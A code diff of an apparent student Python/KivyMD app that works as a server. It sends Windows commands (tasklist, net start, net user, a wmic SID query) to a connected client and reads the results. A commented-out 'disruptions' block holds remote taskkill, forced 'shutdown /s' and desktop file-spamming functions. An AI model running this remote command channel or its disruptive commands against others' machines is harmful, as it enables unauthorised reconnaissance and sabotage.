@@ -32,10 +32,10 @@ ScreenManager:
         name: "mainMenu"
         MDGridLayout:
             adaptive_height: True
-            pos_hint: {"center_x": 0.5, "center_y": 0.95}
+            pos_hint: {"center_x": 0.6, "center_y": 0.5}
             orientation: 'lr-tb'
             spacing: 10
-            cols: 5
+            cols: 2
             MDRectangleFlatButton:
                 id: networkInfoBtn
                 text: "Network Info"
@@ -49,35 +49,33 @@ ScreenManager:
                 pos_hint: {"center_x": .5, "center_y": .5}
                 opacity: 1
                 disabled: False
-                on_press: app.cpuusage()
+                on_press: app.CpuUsage()
             MDRectangleFlatButton:
                 id: taskBtn
                 text: "Task List"
                 pos_hint: {"center_x": .5, "center_y": .5}
                 opacity: 1
                 disabled: False
-                on_press: app.tasks()
+                on_press: app.Tasks()
             MDRectangleFlatButton:
                 id: netserviceBtn
                 text: "Network Services"
                 pos_hint: {"center_x": .5, "center_y": .5}
                 opacity: 1
                 disabled: False
-                on_press: app.services()
+                on_press: app.Services()
             MDRectangleFlatButton:
                 id: userInfoBtn
                 text: "User Information"
                 pos_hint: {"center_x": .5, "center_y": .5}
                 opacity: 1
                 disabled: False
-                on_press: app.userInfo()
+                on_press: app.UserInfo()
 '''
-
 
 class Main(MDApp):
     def build(self):
         return Builder.load_string(KV)
-
 
     def StartServer(self):
         # Server IP and Port
@@ -96,9 +94,9 @@ class Main(MDApp):
         # print('Listening for a client connection to be established...')
         self.root.ids.startBtn.disabled = True
         self.root.ids.startBtn.opacity = 0
-        threading.Thread(target=self.mainloop).start()
+        threading.Thread(target=self.MainLoop).start()
 
-    def mainloop(self):
+    def MainLoop(self):
         while True:
             # Check whether connection is established
             self.currConn = self.server.accept()[0]
@@ -121,7 +119,7 @@ class Main(MDApp):
             break
 
     # Zees stuff
-    def cpuusage(self):
+    def CpuUsage(self):
         while True:
             command = 'wmic cpu get loadpercentage'
             self.currConn.send(command.encode())
@@ -132,21 +130,21 @@ class Main(MDApp):
             break
 
 
-    def tasks(self):
+    def Tasks(self):
         while True:
-            # send command to client
+            #Send command to client
             command = 'tasklist'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
 
-            # receive output from client
-            output = self.currConn.recv(20480)  # Still needs more buffer
+            #Receive output from client
+            output = self.currConn.recv(20480)  #Still needs more buffer
             output = output.decode()
             print('Output: ', output)
             break
 
 
-    def services(self):
+    def Services(self):
         while True:
             command = 'net start'
             self.currConn.send(command.encode())
@@ -157,7 +155,7 @@ class Main(MDApp):
             break
 
     # Fang's stuffz
-    def userInfo(self):
+    def UserInfo(self):
         while True:
             # Get Username, Fullname, Last Login
             command = 'net user "%USERNAME%"'
@@ -165,12 +163,14 @@ class Main(MDApp):
             print('Command sent to client: ', command)
             output = self.currConn.recv(8096).decode()
             output = output.splitlines()
+            
             # Get SID
             command = 'wmic useraccount where name="%USERNAME%" get sid'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             output2 = self.currConn.recv(8096).decode()
             output2 = output2.splitlines()
+            
             # Print results
             print('Output: ')
             print(f"{output[0]}\n{output[1]}\n{output[8]}")
@@ -178,8 +178,8 @@ class Main(MDApp):
             break
 
 """
-UNTESTED SO I COMMENTED DISRUPRIONS OUT FOR NOW
-def killtask():
+UNTESTED SO I COMMENTED DISRUPRIONS OUT FOR NOW OMEGALUL
+def KillTask():
     while True:
         procname = input('Enter Process Name: ')
         command = 'taskkill /im' + procname
@@ -190,14 +190,14 @@ def killtask():
         output = output.decode()
         print('Output: ', output)
         break
-def shutdown():
+def Shutdown():
     while True:
         command = 'shutdown /s'
         command = command.encode()
         currConn.send(command)
         print('Command sent to client: ', command)
         break
-def filecreate():
+def FileCreate():
     while True:
         command = 'cd Desktop && FOR /L %A IN (1 1 20) DO (echo. > “You suck eggs %A.txt”)'
         command = command.encode()
